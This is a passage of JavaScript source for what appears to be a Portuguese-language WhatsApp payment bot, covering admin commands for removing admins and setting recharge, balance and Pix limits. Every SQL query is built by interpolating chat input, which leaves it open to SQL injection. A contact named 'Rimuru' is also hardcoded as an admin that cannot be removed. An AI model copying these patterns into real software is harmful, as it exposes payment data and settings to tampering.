                Texto = `*ESTE NÚMERO NÃO ESTAVA COMO ADM! TEM CERTEZA QUE ESTÁ TENTANDO DELETAR O ADM CERTO?*

*LISTA ATUAL DE ADMS*

${Adms.join("\n")}

*Rimuru* é um ADM que não pode ser removido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            await DataBase_Better.prepare(`DELETE FROM GERENTES WHERE ID_CONTATO = '${CONTATO_ADM}'`).run();

            Adms = []
            Adms.push(Numero_Dono)

            Array_Gerentes = await DataBase_Better.prepare(`SELECT * FROM GERENTES`).all()
            for await (Gerente of Array_Gerentes) {
                Adms.push(Gerente["ID_CONTATO"])
            }

            Texto = `*ADM DELETADO: wa.me/${CONTATO_ADM}*

*LISTA ATUAL DE ADMS*

${Adms.join("\n")}

*Rimuru* é um ADM que não pode ser removido!
`
            Rimuru_Contato = await Rimuru_Contato_Plan()
            Adms.push(Rimuru_Contato)
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/recargaminima===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                MIN_RECARGA_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
                RECARGA_MINIMA = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${RECARGA_MINIMA}' WHERE PARAMETRO = 'MIN_RECARGA'`).run()
                MIN_RECARGA_Ant = parseFloat(MIN_RECARGA_Ant).toFixed(2)
                RECARGA_MINIMA = parseFloat(RECARGA_MINIMA).toFixed(2)
                Texto = `*RECARGA MÍNIMA ALTERADA COM SUCESSO!*

*ANTES:* R$: ${MIN_RECARGA_Ant}

*AGORA:* R$: ${RECARGA_MINIMA}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/limitesaldo===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                LIMITE_SALDO_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_SALDO'`).get()["VALOR"]
                LIMITE_SALDO = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${LIMITE_SALDO}' WHERE PARAMETRO = 'LIMITE_SALDO'`).run()
                LIMITE_SALDO_Ant = parseFloat(LIMITE_SALDO_Ant).toFixed(2)
                LIMITE_SALDO = parseFloat(LIMITE_SALDO).toFixed(2)
                Texto = `*LIMITE SALDO ALTERADO COM SUCESSO!*

*ANTES:* R$: ${LIMITE_SALDO_Ant}

*AGORA:* R$: ${LIMITE_SALDO}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/limitepix===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                LIMITE_GERAR_PIX_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'LIMITE_GERAR_PIX'`).get()["VALOR"]
                LIMITE_GERAR_PIX = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${LIMITE_GERAR_PIX}' WHERE PARAMETRO = 'LIMITE_GERAR_PIX'`).run()
                LIMITE_GERAR_PIX_Ant = parseFloat(LIMITE_GERAR_PIX_Ant).toFixed(2)
                LIMITE_GERAR_PIX = parseFloat(LIMITE_GERAR_PIX).toFixed(2)
                Texto = `*LIMITE PIX A GERAR ALTERADO COM SUCESSO!*

*ANTES:* R$: ${LIMITE_GERAR_PIX_Ant}

*AGORA:* R$: ${LIMITE_GERAR_PIX}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/autopix===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*OPÇÃO DE PIX AUTOMÁTICO DESABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'HABILITAR_PIX_AUTO'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "1") {
                Texto = `*OPÇÃO DE PIX AUTOMÁTICO HABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'HABILITAR_PIX_AUTO'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/manualpix===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*OPÇÃO DE PIX MANUAL DESABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'HABILITAR_PIX_MANUAL'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "1") {
                Texto = `*OPÇÃO DE PIX MANUAL HABILITADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'HABILITAR_PIX_MANUAL'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `Comando inválido!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

